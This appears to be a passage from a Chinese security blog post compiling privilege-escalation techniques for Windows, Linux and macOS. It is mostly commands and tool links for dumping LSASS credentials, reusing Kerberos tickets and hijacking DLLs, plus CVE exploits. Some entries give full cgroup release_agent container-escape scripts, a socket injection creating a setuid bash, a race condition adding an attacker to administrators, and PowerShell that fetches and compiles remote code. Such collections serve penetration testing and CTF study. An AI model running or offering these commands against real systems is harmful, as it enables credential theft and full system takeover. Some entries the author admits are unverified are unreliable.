<h3 id="Dump-lsass-with-SilentProcessExit"><a href="#Dump-lsass-with-SilentProcessExit" class="headerlink" title="Dump lsass with SilentProcessExit"></a>Dump lsass with SilentProcessExit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ol>
<li><code>SilentProcessExit.exe pid</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/deepinstinct/LsassSilentProcessExit">https://github.com/deepinstinct/LsassSilentProcessExit</a></p>
<h3 id="Lsass-Shtinkering"><a href="#Lsass-Shtinkering" class="headerlink" title="Lsass Shtinkering"></a>Lsass Shtinkering</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ol>
<li><code>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</code></li>
<li><code>LSASS_Shtinkering.exe pid</code></li>
</ol>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></p>
<h3 id="AndrewSpecial"><a href="#AndrewSpecial" class="headerlink" title="AndrewSpecial"></a>AndrewSpecial</h3><p>域: No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>AndrewSpecial.exe</code></li>
</ul>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/hoangprod/AndrewSpecial">https://github.com/hoangprod/AndrewSpecial</a></p>
<h3 id="CCACHE-ticket-reuse-from-x2F-tmp"><a href="#CCACHE-ticket-reuse-from-x2F-tmp" class="headerlink" title="CCACHE ticket reuse from &#x2F;tmp"></a>CCACHE ticket reuse from &#x2F;tmp</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ul>
<li><code>ls /tmp/ | grep krb5cc_X</code></li>
<li><code>export KRB5CCNAME=/tmp/krb5cc_X</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keyring"><a href="#CCACHE-ticket-reuse-from-keyring" class="headerlink" title="CCACHE ticket reuse from keyring"></a>CCACHE ticket reuse from keyring</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ul>
<li><code>https://github.com/TarlogicSecurity/tickey</code></li>
<li><code>/tmp/tickey -i</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-SSSD-KCM"><a href="#CCACHE-ticket-reuse-from-SSSD-KCM" class="headerlink" title="CCACHE ticket reuse from SSSD KCM"></a>CCACHE ticket reuse from SSSD KCM</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>git clone https://github.com/fireeye/SSSDKCMExtractor</code></li>
<li><code>python3 SSSDKCMExtractor.py –database secrets.ldb –key secrets.mkey</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keytab"><a href="#CCACHE-ticket-reuse-from-keytab" class="headerlink" title="CCACHE ticket reuse from keytab"></a>CCACHE ticket reuse from keytab</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux&#x2F;Windows&#x2F;Mac</p>
<p>类型：  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>git clone https://github.com/its-a-feature/KeytabParser</code></li>
<li><code>python KeytabParser.py /etc/krb5.keytab</code></li>
<li><code>klist -k /etc/krb5.keytab</code></li>
</ul>
<p>Or</p>
<ul>
<li><code>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</code></li>
<li><code>python3 keytabextract.py krb5.keytab</code></li>
<li><code>./bifrost -action dump -source keytab -path test</code></li>
</ul>
<h3 id="SSH-Forwarder"><a href="#SSH-Forwarder" class="headerlink" title="SSH Forwarder"></a>SSH Forwarder</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li>转发代理 yes<code>ForwardAgent yes</code></li>
<li><code>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</code></li>
</ul>
<p>AppleScript</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Enumeration &amp; Hunt</p>
<p>方法： </p>
<ul>
<li>(EmPyre) &gt; <code>listeners</code></li>
<li>(EmPyre: listeners) &gt; <code>set Name mylistener</code></li>
<li>(EmPyre: listeners) &gt; <code>execute</code></li>
<li>(EmPyre: listeners) &gt; <code>usestager applescript mylistener</code></li>
<li>(EmPyre: stager&#x2F;applescript) &gt; <code>execute</code></li>
</ul>
<p>批注：这个工具我找了半天，发现这是个七八年前的一个工具</p>
<p>链接地址<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/EmPyre">https://github.com/EmpireProject/EmPyre</a></p>
<h3 id="DLL-Search-Order-Hijacking"><a href="#DLL-Search-Order-Hijacking" class="headerlink" title="DLL Search Order Hijacking"></a>DLL Search Order Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</code></li>
<li>运行<code>Brownie</code></li>
</ul>
<h3 id="Slui-File-Handler-Hijack-LPE"><a href="#Slui-File-Handler-Hijack-LPE" class="headerlink" title="Slui File Handler Hijack LPE"></a>Slui File Handler Hijack LPE</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</code></li>
<li><code>Slui.exe</code></li>
</ul>
<h3 id="CDPSvc-DLL-Hijacking"><a href="#CDPSvc-DLL-Hijacking" class="headerlink" title="CDPSvc DLL Hijacking"></a>CDPSvc DLL Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>Cdpsgshims.exe</code></li>
</ul>
<h3 id="Magnify-exe-Dll-Search-Order-Hijacking"><a href="#Magnify-exe-Dll-Search-Order-Hijacking" class="headerlink" title="Magnify.exe Dll Search Order Hijacking"></a>Magnify.exe Dll Search Order Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>将有效负载 dll 作为 igdgmm64.dll 复制到可写的系统路径 %PATH%，例如 C:\python27</code></li>
<li>按Win键+L</li>
<li>按回车键</li>
<li><code>在显示密码框的登录屏幕上按 WinKey++(plusKey).</code></li>
<li><code>然后payload dll将以系统访问权限执行.</code></li>
</ul>
<h3 id="CdpSvc-Service"><a href="#CdpSvc-Service" class="headerlink" title="CdpSvc Service"></a>CdpSvc Service</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>使用 acltest.ps1 查找可写系统路径（例如 C:\python27）</code></li>
<li><code>C:\CdpSvcLPE&gt; powershell -ep bypass “..\acltest.ps1”</code></li>
<li>将 <code>cdpsgshims.dll</code>复制到 <code>C:\python27</code></li>
<li>创建 <code>C:\temp</code> 文件夹并将 <code>impersonate.bin</code> 复制到 <code>C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; mkdir C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</code></li>
<li>重新启动（或以管理员身份停止&#x2F;启动 CDPSvc）</li>
<li><code>cmd 将提示 nt authority\system。</code></li>
</ul>
<h3 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>HiveNightmare.exe 200</code></li>
</ul>
<p>CVE-2021-30655</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<p>CVE-2019-8526</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2020-9771</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2021-3156</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2018-4280</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/bazad/launchd-portrep</code></li>
<li><code>./launchd-portrep ‘touch /tmp/exploit-success’=</code></li>
</ul>
<h3 id="Abusing-with-FileRestorePrivilege"><a href="#Abusing-with-FileRestorePrivilege" class="headerlink" title="Abusing with FileRestorePrivilege"></a>Abusing with FileRestorePrivilege</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-RestoreAndBackupPrivileges"><a href="#Abusing-with-RestoreAndBackupPrivileges" class="headerlink" title="Abusing with RestoreAndBackupPrivileges"></a>Abusing with RestoreAndBackupPrivileges</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopyBackupPrivilege"><a href="#Abusing-with-ShadowCopyBackupPrivilege" class="headerlink" title="Abusing with ShadowCopyBackupPrivilege"></a>Abusing with ShadowCopyBackupPrivilege</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<h3 id="Abusing-with-ShadowCopy"><a href="#Abusing-with-ShadowCopy" class="headerlink" title="Abusing with ShadowCopy"></a>Abusing with ShadowCopy</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abuse Privilege</p>
<p>方法： </p>
<ul>
<li><code>poptoke.exe</code></li>
</ul>
<p>批注：我找了很多，感觉最像是的应该是这个工具</p>
<p>链接<a target="_blank" rel="noopener" href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></p>
<h3 id="Dynamic-Phishing"><a href="#Dynamic-Phishing" class="headerlink" title="Dynamic Phishing"></a>Dynamic Phishing</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  Phish</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<h3 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Race Condition</p>
<p>方法： </p>
<ul>
<li><code>echo “net localgroup administrators attacker /add” &gt; C:\temp\not-evil.bat</code></li>
<li><code>tempracer.exe C:\ temp\*.bat</code></li>
</ul>
<h3 id="Abusing-usermode-helper-API"><a href="#Abusing-usermode-helper-API" class="headerlink" title="Abusing usermode helper API"></a>Abusing usermode helper API</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<pre class="line-numbers language-none"><code class="language-none">d&#x3D;&#96;dirname $(ls -x &#x2F;s*&#x2F;fs&#x2F;c*&#x2F;*&#x2F;r* |head -n1)&#96;
mkdir -p $d&#x2F;w; echo 1 &gt; $d&#x2F;w&#x2F;notify_on_release
t&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;
touch &#x2F;o; echo $t&#x2F;c &gt; $d&#x2F;release_agent
echo “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;c
echo “ps &gt; $t&#x2F;o” &gt;&gt; &#x2F;c
chmod +x &#x2F;c
sh -c “echo 0 &gt; $d&#x2F;w&#x2F;cgroup.procs”; sleep 1
cat &#x2F;o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Escape-only-with-CAP-SYS-ADMIN-capability"><a href="#Escape-only-with-CAP-SYS-ADMIN-capability" class="headerlink" title="Escape only with CAP_SYS_ADMIN capability"></a>Escape only with CAP_SYS_ADMIN capability</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o rdma cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x
echo 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release
host_path&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;
echo “$host_path&#x2F;cmd” &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent
echo “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;cmd
echo “ps aux &gt; $host_path&#x2F;output” &gt;&gt; &#x2F;cmd
chmod a+x &#x2F;cmd
sh -c “echo \$\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs”
cat &#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Abusing-exposed-host-directories"><a href="#Abusing-exposed-host-directories" class="headerlink" title="Abusing exposed host directories"></a>Abusing exposed host directories</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Abusing Capabilities</p>
<p>方法： </p>
<ul>
<li><code>mknod /dev/sdb1 block 8 17</code></li>
<li><code>mkdir /mnt/host_home</code></li>
<li><code>mount /dev/sdb1 /mnt/host_home</code></li>
<li><code>echo ‘echo “Hello from container land!” 2&gt;&amp;1’ &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</code></li>
</ul>
<h3 id="Unix-Wildcard"><a href="#Unix-Wildcard" class="headerlink" title="Unix Wildcard"></a>Unix Wildcard</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>python wildpwn.py –file /tmp/very_secret_file combined ./pwn_me/</code></li>
</ul>
<h3 id="Socket-Command-Injection"><a href="#Socket-Command-Injection" class="headerlink" title="Socket Command Injection"></a>Socket Command Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>echo “cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;” | socat – UNIX-CLIENT:/tmp/socket_test.s</code></li>
</ul>
<h3 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><p><code>/etc/logstash/logstash.yml</code></p>
<pre class="line-numbers language-none"><code class="language-none">input &#123;
exec &#123;

           command &#x3D;&gt; “whoami”

           interval &#x3D;&gt; 120

           &#125;

     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="UsoDllLoader"><a href="#UsoDllLoader" class="headerlink" title="UsoDllLoader"></a>UsoDllLoader</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Injection</p>
<p>方法： </p>
<ul>
<li><code>UsoDllLoader.exe</code></li>
</ul>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824">https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824</a></p>
<h3 id="Trend-Chain-Methods-for-Privilege-Escalation"><a href="#Trend-Chain-Methods-for-Privilege-Escalation" class="headerlink" title="Trend Chain Methods for Privilege Escalation"></a>Trend Chain Methods for Privilege Escalation</h3><h3 id="Habanero-Chilli"><a href="#Habanero-Chilli" class="headerlink" title="Habanero Chilli"></a>Habanero Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Dll Side-loading</p>
<p>方法： </p>
<ul>
<li><code>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</code></li>
</ul>
<h3 id="Padron-Chilli"><a href="#Padron-Chilli" class="headerlink" title="Padron Chilli"></a>Padron Chilli</h3><p>域：Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p>
<p>方法： </p>
<ul>
<li><code>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</code></li>
</ul>
<h3 id="Jalapeno-Chillies"><a href="#Jalapeno-Chillies" class="headerlink" title="Jalapeno Chillies"></a>Jalapeno Chillies</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>方法：  unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p>
<p>方法： </p>
<ul>
<li><code>NihilistGuy.exe</code></li>
</ul>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/analyticsearch/NihilistGuy">https://github.com/analyticsearch/NihilistGuy</a></p>
<h3 id="Pasilla-Chili"><a href="#Pasilla-Chili" class="headerlink" title="Pasilla Chili"></a>Pasilla Chili</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>方法：  SeImpersonatePrivilege + Abusing Service Account Session</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo5.ps1</code></li>
</ul>
<h3 id="Finger-Chilli"><a href="#Finger-Chilli" class="headerlink" title="Finger Chilli"></a>Finger Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Abusing PrintNotify Service + DLL side-loading</p>
<p>方法： </p>
<ul>
<li><code>以管理员身份，将winspool.drv和mod-ms-win-core-apiquery-l1-1-0.dll复制到C:\Windows\System32\spool\drivers\x64\3\</code></li>
<li><code>将 /bin/ 中包含的所有文件放入同一目录中。</code></li>
<li><code>然后，运行 powershell .\spooltrigger.ps1。</code></li>
<li>享受 NT AUTHORITY\SYSTEM 的 shell。</li>
</ul>
<h3 id="Orange-Cayenne"><a href="#Orange-Cayenne" class="headerlink" title="Orange Cayenne"></a>Orange Cayenne</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver Ticket + I Know</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo1.ps1</code></li>
</ul>
<h3 id="Red-Cayenne"><a href="#Red-Cayenne" class="headerlink" title="Red Cayenne"></a>Red Cayenne</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver ticket + User to User Authentication</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>demo2.ps1</code></li>
</ul>
<h3 id="Birds-Eye-Chilli"><a href="#Birds-Eye-Chilli" class="headerlink" title="Birds Eye Chilli"></a>Birds Eye Chilli</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Silver Ticket + Buffer Type Confusion</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo3.ps1</code></li>
</ul>
<h3 id="Scotch-Bonnet"><a href="#Scotch-Bonnet" class="headerlink" title="Scotch Bonnet"></a>Scotch Bonnet</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Bring Your Own KDC</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo4.ps1</code></li>
</ul>
<h3 id="Lemon-Habanero"><a href="#Lemon-Habanero" class="headerlink" title="Lemon Habanero"></a>Lemon Habanero</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Capabilities</p>
<p>方法： </p>
<ul>
<li><code>gcc -Wl,–no-as-needed -lcap-ng -o ambient ambient.c</code></li>
<li><code>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</code></li>
<li><code>./ambient /bin/bash</code></li>
</ul>
<p>批注：<a target="_blank" rel="noopener" href="https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw">https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw</a></p>
<h3 id="Red-Habanero"><a href="#Red-Habanero" class="headerlink" title="Red Habanero"></a>Red Habanero</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  NtSetInformationProcess + DLL side-loading</p>
<p>方法： </p>
<ul>
<li><code>BypassRtlSetProcessIsCritical.exe pid</code></li>
</ul>
<p>批注：没找到这个东西</p>
<h3 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p>
<p>方法： </p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token variable">$code</span> = <span class="token punctuation">(</span><span class="token function">iwr</span> https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com/usdAG/SharpLink/main/SharpLink<span class="token punctuation">.</span>cs<span class="token punctuation">)</span><span class="token punctuation">.</span>content
<span class="token function">PS</span> C:\> <span class="token function">Add-Type</span> <span class="token variable">$code</span>                                                                                          
<span class="token function">PS</span> C:\> <span class="token variable">$s</span> = <span class="token function">New-Object</span> de<span class="token punctuation">.</span>usd<span class="token punctuation">.</span>SharpLink<span class="token punctuation">.</span>Symlink<span class="token punctuation">(</span>“C:\Users\Public\Example\link”<span class="token punctuation">,</span> “C:\ProgramData\target<span class="token punctuation">.</span>txt”<span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token function">echo</span> “Hello World :D” > C:\Users\Public\Example\link
<span class="token function">PS</span> C:\> <span class="token function">type</span> C:\ProgramData\target<span class="token punctuation">.</span>txt
Hello World 😀
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Chocolate-Scorpion-Chilli"><a href="#Chocolate-Scorpion-Chilli" class="headerlink" title="Chocolate Scorpion Chilli"></a>Chocolate Scorpion Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Directory-Deletion + Windows Media Player d&#x2F;s</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/sailay1996/delete2SYSTEM</code></li>
<li><code>.\poc.ps1</code></li>
</ul>
<h3 id="Carolina-Reaper"><a href="#Carolina-Reaper" class="headerlink" title="Carolina Reaper"></a>Carolina Reaper</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Creates an arbitrary service + PTH</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo6.ps1</code></li>
</ul>
<h3 id="The-Intimidator-Chilli"><a href="#The-Intimidator-Chilli" class="headerlink" title="The Intimidator Chilli"></a>The Intimidator Chilli</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  manipulate memory&#x2F;process token values&#x2F;NT system calls and objects&#x2F;NT object manager</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</code></li>
<li><code>Import-Module NtObjectManager</code></li>
<li><code>Get-ChildItem NtObject:\</code></li>
<li><code>NT*</code></li>
</ul>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>摘选自[117种提权方法](<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HO1gV2WjX-cxpRTeHgkYW7opx01zPy6NqCBn2xA7&target_url=https://mp.weixin.qq.com/s/mqJ6rcFeKtCze0F5GN257Q">微信公众平台 (qq.com)</a>)</p>
 
      <!-- reward -->
      
      <div id="reword-out">
        <div id="reward-btn">
          打赏
        </div>
      </div>
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/11/21/spring%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            spring系列漏洞复现
          
        </div>
      </a>
    
    
      <a href="/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">SSTI漏洞总结学习</div>
      </a>
    
  </nav>

   
<!-- valine评论 -->
<div id="vcomments-box">
  <div id="vcomments"></div>
</div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
<script>
  new Valine({
    el: "#vcomments",
